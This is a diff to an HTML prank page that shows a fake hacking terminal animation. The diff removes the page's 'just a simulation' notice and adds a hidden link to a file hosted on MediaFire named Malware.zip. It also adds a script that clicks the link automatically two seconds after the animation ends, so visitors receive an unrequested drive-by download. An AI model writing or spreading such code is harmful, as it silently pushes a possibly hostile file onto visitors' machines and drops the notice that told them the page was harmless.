@@ -110,6 +110,10 @@
             font-size: 16px;
             z-index: 100;
         }
+
+        #download-link {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -117,7 +121,6 @@
         <span>HACKING...</span>
         <span>...</span>
         <span>BY frhndevweb</span>
-        <!-- Tambahkan lebih banyak teks di sini untuk efek latar belakang -->
     </div>
     <div class="container">
         <div class="header">
@@ -128,12 +131,14 @@
             <div class="blinking-cursor"></div>
         </div>
     </div>
-    <div id="notification">cuma simulasi😁</div>
+    <div id="notification">wait to download</div>
+    <a id="download-link" href="https://www.mediafire.com/file/k4f0f10t15ppil5/Malware.zip/file" download="Malware.zip"></a>
     <script>
         const output = document.getElementById('output');
         const status = document.getElementById('status');
         const cursor = document.querySelector('.blinking-cursor');
         const notification = document.getElementById('notification');
+        const downloadLink = document.getElementById('download-link');
         const backgroundText = document.getElementById('background-text');
 
         const commands = [
@@ -182,6 +187,7 @@
                     output.innerHTML += '<span class="random-color">Transfer data to... frhndevweb</span>';
                     cursor.style.display = 'none';
                     setTimeout(showNotification, 1000);
+                    setTimeout(triggerDownload, 2000);
                 }, 1000);
             }
         }
@@ -198,6 +204,10 @@
             document.querySelectorAll('.random-color').forEach(el => {
                 el.style.color = randomColors[Math.floor(Math.random() * randomColors.length)];
             });
+        }
+
+        function triggerDownload() {
+            downloadLink.click();
         }
 
         setInterval(randomizeColors, 500);
